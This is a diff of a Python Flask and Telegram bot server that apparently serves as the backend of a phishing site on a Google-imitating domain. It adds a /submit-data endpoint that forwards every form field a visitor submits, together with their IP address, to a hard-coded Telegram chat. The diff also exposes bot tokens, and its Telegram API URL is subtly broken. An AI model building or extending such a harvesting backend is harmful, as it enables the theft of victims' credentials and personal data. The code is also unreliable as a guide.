@@ -1,6 +1,7 @@
 import logging
 import threading
-from flask import Flask, request
+from flask import Flask, request, jsonify
+from flask_cors import CORS
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
@@ -8,15 +9,18 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 # ==========================================
 # ⚙️ CONFIGURATION
 # ==========================================
-BOT_TOKEN = "8678223570:AAG-1KvXMFolxyp9gt5e-OP7DSdsOeEluqo"
+BOT_TOKEN = "8678223570:AAF2R9JS4XGsPfGr9QxiTdL3bLZ5D270GDA"
 CHAT_ID = "6546086469" 
 CORRECT_VERIFICATION_CODE = "SECRET123"
 
-# Fixed: Removed the accidental line break inside the string quotes
+# Updated with your active frontend tracking address
 MY_WEBSITE_URL = "https://corevista-netgoogle.lovable.app"
 
 # Initialize Flask application engine
 flask_app = Flask(__name__)
+
+# Explicitly allow your domain to safely pass telemetry to the Flask server
+CORS(flask_app, resources={r"/*": {"origins": "https://corevista-netgoogle.lovable.app"}})
 
 PORTAL_HTML = """
 <!DOCTYPE html>
@@ -48,12 +52,12 @@ PORTAL_HTML = """
 """
 
 def send_alert_to_telegram(message):
-    """Dispatches direct URL requests to ensure traffic clears cloud proxies."""
-    # Fixed: Corrected the endpoint to api.telegram.org and added the /bot prefix
+    """Dispatches direct URL requests securely to the core Telegram API endpoints."""
     url = f"https://telegram.org{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
     try: 
-        requests.post(url, json=payload, timeout=5)
+        response = requests.post(url, json=payload, timeout=5)
+        print(f"Telegram API Status Response: {response.status_code}")
     except Exception as e: 
         print(f"Network error routing alert packet: {e}")
 
@@ -70,6 +74,22 @@ def web_portal_home():
     )
     send_alert_to_telegram(log_message)
     return PORTAL_HTML
+
+@flask_app.route('/submit-data', methods=['POST'])
+def handle_external_data():
+    try:
+        data = request.get_json() if request.is_json else request.form.to_dict()
+        details = "\\n".join([f"🔹 *{k}:* `{v}`" for k, v in data.items()])
+        
+        log_message = (
+            f"📥 *NEW SUBMISSION RECEIVED*\n\n"
+            f"{details}\n\n"
+            f"🌐 *Origin IP:* `{request.remote_addr}`"
+        )
+        send_alert_to_telegram(log_message)
+        return jsonify({"status": "success", "message": "Telemetry logged."}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 # ==========================================
 # 🤖 ASYNCHRONOUS TELEGRAM TELEMETRY ENGINE
@@ -96,7 +116,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        text=f"⚙️ *Live Session Controller Menu*:\nYour tracking domain is set to: {MY_WEBSITE_URL}","https://corevista-netgoogle
+        text=f"⚙️ *Live Session Controller Menu*:\nYour tracking domain is set to: {MY_WEBSITE_URL}",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
@@ -122,11 +142,7 @@ async def verify_text_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     else:
         await update.message.reply_text("❌ Validation failure. Code is incorrect.")
 
-# ==========================================
-# 🚀 HOOK INTO RENDER'S WEB BIND ENGINE
-# ==========================================
 def init_polling_worker():
-    """Runs polling inside an independent background thread cleanly."""
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_click_handler))
@@ -136,5 +152,4 @@ def init_polling_worker():
 if __name__ == '__main__':
     bot_worker = threading.Thread(target=init_polling_worker, daemon=True)
     bot_worker.start()
-    
     flask_app.run(host='0.0.0.0', port=5000)
